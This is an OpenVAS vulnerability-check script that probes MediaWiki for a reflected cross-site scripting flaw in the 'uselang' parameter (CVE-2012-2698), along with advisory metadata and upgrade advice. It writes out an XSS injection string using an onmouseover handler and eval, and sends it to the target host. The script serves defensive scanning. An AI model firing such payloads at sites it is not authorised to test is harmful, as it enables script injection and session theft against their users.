##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mediawiki_uselang_param_xss_vuln.nasl 3565 2016-06-21 07:20:17Z benallard $
#
# MediaWiki 'uselang' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.
  Impact Level: Application";
tag_affected = "MediaWiki versions prior to 1.17.5, 1.8.x before 1.18.4 and 1.19.x before 1.19.1";
tag_insight = "Input passed via the 'uselang' parameter to 'index.php/Main_page' is not
  properly sanitised in the 'outputPage()' function, before being returned
  to the user.";
tag_solution = "Upgrade to MediaWiki version 1.17.5, 1.18.4, or 1.19.1 or later.
  For updates refer to http://www.mediawiki.org/wiki/MediaWiki";
tag_summary = "This host is running MediaWiki and is prone to cross site scripting
  vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802910";
CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3565 $");
  script_cve_id("CVE-2012-2698");
  script_bugtraq_id(53998);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:20:17 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2012-07-09 13:41:49 +0530 (Mon, 09 Jul 2012)");
  script_name("MediaWiki 'uselang' Parameter Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49484");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1027179");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/76311");
  script_xref(name : "URL" , value : "https://bugzilla.wikimedia.org/show_bug.cgi?id=36938");
  script_xref(name : "URL" , value : "http://www.openwall.com/lists/oss-security/2012/06/14/2");

  script_summary("Check if MediaWiki is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_mediawiki_detect.nasl");
  script_require_keys("mediawiki/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
req = "";
res = "";
host = "";
dir = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check port state
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Get installed location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

url = dir + '/index.php/Main_Page?uselang=a%27%20onmouseover=eval(alert("document.cookie"))%20e=%27';
req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");
res = http_send_recv(port:port, data:req);

if(egrep(pattern:"^HTTP/.* 200 OK", string:res) &&
         'alert("document.cookie")' >< res && ">MediaWiki" >< res){
 security_message(port);
}
